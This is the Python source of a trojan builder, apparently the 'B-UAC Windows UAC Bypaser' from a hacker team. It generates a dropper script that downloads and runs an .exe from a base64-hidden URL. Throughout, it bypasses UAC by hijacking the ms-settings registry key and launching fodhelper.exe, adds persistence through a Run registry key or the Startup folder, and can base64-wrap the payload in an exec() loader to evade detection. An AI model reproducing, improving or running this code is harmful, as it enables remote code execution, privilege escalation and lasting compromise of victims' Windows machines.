#!/usr/bin/env python
import optparse
import os
import sys
import os
import time
from colorama import Style, Fore
import random
import string
import base64
import getpass
import py_compile

parser = optparse.OptionParser()

parser.add_option('-l', '--link',
    action="store", dest="link",
    help="Link to .exe file to download and run. (IMPORTANT: PLEASE MAKE SURE THE FILE IS AN .exe OTHERWISE IT WONT WORK PROPERLY!)", default="")
parser.add_option('-o', '--output',
    action="store", dest="name",
    help="File to save as.", default="")
parser.add_option('-e', '--encode',
    action="store_true", dest="encode",default=False,
    help="Encode output file in Base64-Based.")
parser.add_option('-b', '--bypass',
    action="store_true", dest="bypass",default=False,
    help="Bypass UAC and run the file as admin.")
parser.add_option('-r', '--reg',
    action="store_true", dest="regKey",default=False,
    help="Bypass UAC and create persistent registry key.")
parser.add_option('-s', '--start-up',
    action="store_true", dest="startUp",default=False,
    help="Bypass UAC and create persistent start-up file.")

options, args = parser.parse_args()

global admina
global bypass
global reg
global start
global run_bypass
global bypass_code
global reg_code
global startup_code
global createReg
global createStart
createReg = ""
createStart = ""
run_bypass = ""
bypass_code = ""
reg_code = ""
startup_code = ""

class color:
   PURPLE = '\033[95m'
   CYAN = '\033[96m'
   DARKCYAN = '\033[36m'
   BLUE = '\033[94m'
   GREEN = '\033[92m'
   YELLOW = '\033[93m'
   RED = '\033[91m'
   BOLD = '\033[1m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

if "nt" in os.name:
    os.system("cls")
else:
    os.system("clear")

print(Style.BRIGHT)
if "nt" in os.name:
    os.system("cls")
else:
    os.system("clear")
print("""

*888888b.       *888    *888      *d8888*.d8888b.  
*888  "88b      *888    *888     *d88888d88P *Y88b 
*888  .88P      *888    *888    *d88P888888   *888 
*8888888K.      *888    *888   *d88P*888888        
*888  "Y88b     *888    *888  *d88P *888888        
*888    888888888888    *888 *d88P  *888888   *888 
*888   d88P     *Y88b.*.d88P*d8888888888Y88b *d88P 
*8888888P"       *"Y88888P"*d88P    *888 *"Y8888P"
                                             (1.0)                                        
000000000000000 Windows UAC Bypaser 00000000000000
00000000 Coded By Ghosty / DeaDHackS Team 00000000
0    Github https://github.com/DeaDHackS/B-UAC   0
""")
if not options.link:
    print("[" + color.YELLOW + "!" + color.END + "] Link is not set, please set it!")
    sys.exit()
print("[" + color.GREEN + "+" + color.END + "] URL - " + options.link)
if not options.name:
    print("[" + color.YELLOW + "!" + color.END + "] Name is not set, please set it!")
    sys.exit()
print("[" + color.GREEN + "+" + color.END + "] Name - " + options.name)
print("\n")
if options.bypass == True:
    print("[" + color.GREEN + "YES" + color.END + "] Bypass UAC / Run As Admin.")
    run_bypass += "execute()"
    bypass_code = r"""def is_running_as_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
def create_reg_key(key, value):
    try:
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, REG_PATH)
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, REG_PATH, 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, key, 0, _winreg.REG_SZ, value)
        _winreg.CloseKey(registry_key)
    except WindowsError:
        raise
        
def bypass_uac(cmd):
    try:
        create_reg_key(DELEGATE_EXEC_REG_KEY, '')
        create_reg_key(None, cmd)
    except WindowsError:
        raise
        
def execute():
    if not is_running_as_admin():
        try:
            current_dir = os.path.dirname(os.path.realpath(__file__)) + "\\" + file_name
            username = getpass.getuser()
            sys_dir = "C:\\Users\\"+getpass.getuser()+"\\AppData\\Roaming\\"#+ file_name
            proc2 = subprocess.Popen("move "+current_dir+" "+sys_dir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
            create_reg_key(id_generator(), "Software\Microsoft\Windows\CurrentVersion\Run")
            cmd = '{} /k {}'.format(CMD, sys_dir)
            bypass_uac(cmd)
            os.system(FOD_HELPER)
            sys.exit(0)
        except WindowsError:
            sys.exit(1)"""
else:
    print("[" + color.RED + "NO" + color.END + "] Bypass UAC / Run As Admin.")

if options.regKey == True:
    print("[" + color.GREEN + "YES" + color.END + "] Bypass UAC / Create RegKey.")
    createReg += "RegistryKey()"
    reg_code = r"""def RegistryKey():
    current_dir = os.path.dirname(os.path.realpath(__file__)) + "\\" + file_name
    sys_dir = "C:\\" + file_name
    proc2 = subprocess.Popen("move "+current_dir+" "+sys_dir, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)
    create_reg_key(id_generator(), "Software\Microsoft\Windows\CurrentVersion\Run")
    try:
        _winreg.CreateKey(_winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run")
        registry_key = _winreg.OpenKey(_winreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", 0, _winreg.KEY_WRITE)
        _winreg.SetValueEx(registry_key, id_generator(), 0, _winreg.REG_SZ, sys_dir)
        _winreg.CloseKey(registry_key)
    except WindowsError:
        raise"""
else:
    print("[" + color.RED + "NO" + color.END + "] Bypass UAC / Create RegKey.")

if options.startUp == True:
    print("[" + color.GREEN + "YES" + color.END + "] Bypass UAC / Create Start-up File.")
    createStart += "StartupCopy()"
    startup_code = r"""def StartupCopy():
    username = getpass.getuser()
    current_dir = os.path.dirname(os.path.realpath(__file__)) + "\\" + file_name
    startup_path = "C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" % username
    print startup_path
    proc2 = subprocess.Popen('move '+current_dir+' "'+startup_path+'"', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE,
                             stdin=subprocess.PIPE)"""
else:
    print("[" + color.RED + "NO" + color.END + "] Bypass UAC / Create Start-up File.")

if options.encode == True:
    print("[" + color.GREEN + "YES" + color.END + "] Encode Payload.\n")
else:
    print("[" + color.RED + "NO" + color.END + "] Encode Payload.\n")

print("[" + color.GREEN + "+" + color.END + "] Encrypting URL string ...")
time.sleep(1)

options.link = base64.b64encode(options.link.encode("ascii"))

f = open(options.name, "w+")
if options.encode == True:
    print("[" + color.GREEN + "+" + color.END + "] Encoding Trojan ...")
    full_code = r"""
#!/usr/bin/env python
import os
import sys
import urllib2
import string
import random
import ctypes
import _winreg
from os.path import expanduser
import subprocess
import base64
import getpass
global bypass
global service
global reg
global start
global link
global file_name

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "start"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
bypass = 0
service = 0
reg = 0
start = 0
link = '"""+str(options.link)+r"""'
link = base64.b64decode(link)
file_name = id_generator() + ".exe"


"""+bypass_code+r"""

"""+reg_code+r"""

"""+startup_code+r"""

def DownloadFile(link):
    filedata = urllib2.urlopen(link)
    datatowrite = filedata.read()

    with open(file_name, 'wb') as f:
        f.write(datatowrite)
    """+"\n    "+run_bypass+"\n    "+createReg+"\n    "+createStart+r"""
                       
DownloadFile(link)"""
    encoded_script = base64.b64encode(full_code.encode("ascii"))
    f.writelines("import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('"+str(encoded_script)+"')))")
    print("[" + color.GREEN + "+" + color.END + "] Trojan encoded!!")
else:
    f.writelines(r"""
#!/usr/bin/env python
import os
import sys
import urllib2
import string
import random
import ctypes
import _winreg
from os.path import expanduser
import subprocess
import base64
import getpass
global bypass
global service
global reg
global start
global link
global file_name

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

CMD                   = r"C:\Windows\System32\cmd.exe"
FOD_HELPER            = r'C:\Windows\System32\fodhelper.exe'
PYTHON_CMD            = "start"
REG_PATH              = 'Software\Classes\ms-settings\shell\open\command'
DELEGATE_EXEC_REG_KEY = 'DelegateExecute'
bypass = 0
service = 0
reg = 0
start = 0
link = '"""+str(options.link)+r"""'
link = base64.b64decode(link)
file_name = id_generator() + ".exe"


"""+bypass_code+r"""

"""+reg_code+r"""

"""+startup_code+r"""

def DownloadFile(link):
    filedata = urllib2.urlopen(link)
    datatowrite = filedata.read()

    with open(file_name, 'wb') as f:
        f.write(datatowrite)
    """+"\n    "+run_bypass+"\n    "+createReg+"\n    "+createStart+r"""
                       
DownloadFile(link)""")
print("[" + color.GREEN + "+" + color.END + "] Trojan generated!!\n")
print("[" + color.GREEN + "+" + color.END + "] Saved As: "+str(options.name))







































